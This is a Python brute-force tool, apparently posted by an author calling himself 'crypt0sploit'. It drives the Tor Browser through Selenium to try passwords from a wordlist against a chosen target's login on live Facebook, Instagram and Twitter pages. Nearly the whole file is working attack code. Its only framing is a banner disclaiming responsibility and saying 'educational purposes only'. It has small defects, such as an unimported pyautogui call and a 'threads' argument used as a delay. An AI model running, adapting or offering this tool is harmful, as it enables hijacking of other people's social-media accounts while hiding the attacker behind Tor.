"""
BRUTEFORCE BOT FOR ANY SOCIAL-MEDIA
@AUTHOR crypt0sploit
@DATE 1 Mar 2019
"""

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from tbselenium.tbdriver import TorBrowserDriver
import sys
import time

class brute_bot(object):

    def __init__(self, email, password, site, email_field, pass_field, threads, login_btn):
        self.email = email
        self.password = password
        self.site = site
        self.email_field = email_field
        self.pass_field = pass_field
        self.threads = threads
        self.login_btn = login_btn
        self.driver = TorBrowserDriver()  # Enter here directory if TOR Browser

    def bruteforcer(self):
        driver = self.driver
        pass_found = False
        driver.get(self.site)

        if sys.argv[1] == 'facebook':
            email_box = driver.find_element_by_name(f'{self.email_field}')
            email_box.clear()
            email_box.send_keys(self.email)

            while not pass_found:
                for i in self.password:
                    try:
                        password_box = driver.find_element_by_name(self.pass_field)
                        password_box.clear()
                        password_box.send_keys(i)
                        log_site = driver.find_element_by_name(self.login_btn)
                        log_site.click()
                        #pyautogui.press("return")
                        time.sleep(int(sys.argv[3]))
                        old = i
                        print(f"Trying - {i}")
                    except NoSuchElementException:
                        pass_found = True
                        if pass_found == True:
                            print(f'Password is >> {old} ')
                            driver.close()
                            break

        elif sys.argv[1] == "instagram":
            time.sleep(2)
            email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
            email_box.clear()
            email_box.send_keys(self.email)

            while not pass_found:
                for i in self.password:
                    try:
                        password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
                        password_box.clear()
                        password_box.send_keys(i)
                        log_site = driver.find_element_by_class_name(f'{self.login_btn}')
                        log_site.click()
                        time.sleep(int(sys.argv[3]))
                        old = i
                        print(f"Trying - {i}")
                    except NoSuchElementException:
                        pass_found = True
                        if pass_found == True:
                            print(f'Password is >> {old} ')
                            driver.close()
                            break

        elif sys.argv[1] == "twitter":
            email_box = driver.find_element_by_class_name(f'{self.email_field}')
            email_box.clear()
            email_box.send_keys(self.email)

            while not pass_found:
                for i in self.password:
                    try:
                        password_box = driver.find_element_by_class_name(f'{self.pass_field}')
                        password_box.clear()
                        password_box.send_keys(i)
                        pyautogui.press('enter')
                        time.sleep(int(sys.argv[3]))
                        old = i
                        print(f"Trying - {i}")
                    except NoSuchElementException:
                        pass_found = True
                        if pass_found == True:
                            print(f'Password is >> {old} ')
                            driver.close()
                            break

banner = """\n\t

   _____            _       _  _____                _
  / ____|          (_)     | |/ ____|              | |
 | (___   ___   ___ _  __ _| | |     _ __ __ _  ___| | __
  \___ \ / _ \ / __| |/ _` | | |    | '__/ _` |/ __| |/ /
  ____) | (_) | (__| | (_| | | |____| | | (_| | (__|   <
 |_____/ \___/ \___|_|\__,_|_|\_____|_|  \__,_|\___|_|\_\\

            AUTHOR --> crypt0sploit ( Adrian )
            INSTAGRAM --> _adyadrian_aa

        I'M NOT RESPONSABLE FOR ANY OF YOUR ACTIONS!
            USE FOR EDUCATIONAL PURPOSES ONLY!

"""

def main_menu():

    if sys.argv[1] == "facebook":
        site = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=0&lwv=110"
        print(banner)
        print("Waking up BOT...")
        efield = 'email'
        pfield = 'pass'
        loginbutton = 'login'
        email1 = str(input("\nThe ID of the target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
        execute.bruteforcer()

    elif sys.argv[1] == "instagram":
        site = "https://www.instagram.com/accounts/login/"
        print(banner)
        print("Waking up BOT...")
        efield = 'username'
        pfield = 'password'
        loginbutton = 'L3NKy'
        email1 = str(input("\nThe Username of the Target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
        execute.bruteforcer()

    elif sys.argv[1] == "twitter":
        site = "https://twitter.com/login/"
        print(banner)
        print("Waking up BOT...")
        efield = 'js-username-field'
        pfield = 'js-password-field'
        loginbutton = 'Igw0E'
        email1 = str(input("\nThe Username/Email of the Target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
        execute.bruteforcer()

if __name__ == "__main__":
    try:
        if len(sys.argv) < 4:
            print(f"""
            {banner}
            \nUsage: python3 {sys.argv[0]} [facebook/instagram/twitter] [wordlist] [threads]\n\n
            """)
        elif len(sys.argv) == 4:
            main_menu()
    except KeyboardInterrupt:
        print("\n\nABORTED !"+'\n\n')
